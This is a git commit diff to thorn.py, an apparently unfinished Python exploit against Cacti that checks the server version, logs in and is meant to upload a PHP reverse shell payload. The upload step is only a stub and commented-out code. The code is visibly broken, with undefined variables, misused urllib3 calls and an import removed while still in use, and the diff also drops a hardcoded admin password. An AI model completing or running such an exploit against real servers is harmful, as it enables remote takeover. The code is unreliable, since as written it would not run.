e21db479adb13dfddf0ada2b3cc80b1c11fb7b5e
declan <declan@pop-os.hub>
2026-01-02 07:58:45 +1300

    code cleanup

--- thorn.py
+++ thorn.py
@@ -15,7 +15,6 @@ import os
 import ssl
 import argparse
 import urllib3
-import urllib.request
 import certifi
 from bs4 import BeautifulSoup
 
@@ -26,31 +25,40 @@ banner = '''
 '''
 print(banner)
 
-# =========================
+if __name__ == '__main__':
+    cli_parser = argparse.ArgumentParser(
+        epilog='''Examples:
+                ./thorn.py http://localhost/cacti admin password
+                ./thorn.py -p './php/rev.php' http://localhost/cacti admin password''',
+        formatter_class=argparse.RawTextHelpFormatter
+    )
+    cli_parser.add_argument('URL',type=str,help='Cacti URL')
+    cli_parser.add_argument('username',type=str,help='Login username')
+    cli_parser.add_argument('password',type=str,help='Login password')
+    cli_parser.add_argument('-p','--payload',type=str,help='Path to the PHP payload file (default: `./payload/shell.php` is a reverse shell created by pentestmonkey, Don\'t forget to change the ip & port)',default='./payload/shell.php')
+    args = cli_parser.parse_args()
+
+    URL = args.URL
+    username = args.username
+    password = args.password
+    filename = args.payload
+
+cacti_url = URL
+
 # HTTP setup
-# =========================
 http = urllib3.PoolManager(
     cert_reqs='CERT_REQUIRED',
     ca_certs=certifi.where()
 )
 
 http_proxy = {'127.0.0.1': 8080}
+session = http.request('GET', cacti_url)
 
-# =========================
-# User input
-# =========================
-cacti_url = input('[>] Enter cacti url: ')
-session = urllib3.request(cacti_url)
-
-# =========================
-# Functions
-# =========================
-def check_cacti_version(version_check):
+def check_cacti_version(session):
     print('[+] Checking cacti version')
-    r = http.request(version_check)
-    r.text
+    resp = session.data()
 
-    if 'Cacti CHANGELOG' in r and '1.2.26' not in r:
+    if 'Cacti CHANGELOG' in resp and '1.2.26' not in r:
         print('[+] Valid version!')
     else:
         print('[-] Invalid version, not going to work..')
@@ -62,8 +70,8 @@ def auth_login():
     auth.add_password(
         realm='Cacti',
         uri=cacti_url,
-        user='admin',
-        passwd='greencacti2001'
+        user=username,
+        passwd=password
     )
     opener = urllib.request.build_opener(auth)
     urllib.request.install_opener(opener)
@@ -75,38 +83,26 @@ def auth_login():
 def payload():
     pass
 
+# check = check_cacti_version(cacti_url + "/CHANGELOG")
 
-# =========================
-# Main
-# =========================
-if __name__ == '__main__':
-    cli_parser = argparse.ArgumentParser(
-        epilog='''Examples:
-                ./thorn.py http://localhost/cacti admin password
-                ./thorn.py -p './php/rev.php' http://localhost/cacti admin password''',
-        formatter_class=argparse.RawTextHelpFormatter
-    )
-    parser.add_argument('URL',type=str,help='Cacti URL')
-    parser.add_argument('username',type=str,help='Login username')
-    parser.add_argument('password',type=str,help='Login password')
-    parser.add_argument('-p','--payload',type=str,help='Path to the PHP payload file (default: `./payload/shell.php` is a reverse shell created by pentestmonkey, Don\'t forget to change the ip & port)',default='./payload/shell.php')
-    args = parser.parse_args()
-
-    URL = args.URL
-    username = args.username
-    password = args.password
-    filename = args.payload
+# if check == False:
+#     sys.exit(0)
     
-    
+# if session.status == 404:
+#     print('[#] Not found')    
+#     sys.exit(0)
+# else:
+#     check_cacti_version(version_check)
     
 
-print('[*] Uploading payload')
+# print('[*] Uploading payload')
 
+# soup = BeautifulSoup(r.text)
 
-data = {
-    '__csrf_magic': csrf,
-    'action': 'login',
-    'login_username': username,
-    'login_password': password,
-    'remember_me': 'on'
-}
+# data = {
+#     '__csrf_magic': csrf,
+#     'action': 'login',
+#     'login_username': username,
+#     'login_password': password,
+#     'remember_me': 'on'
+# }
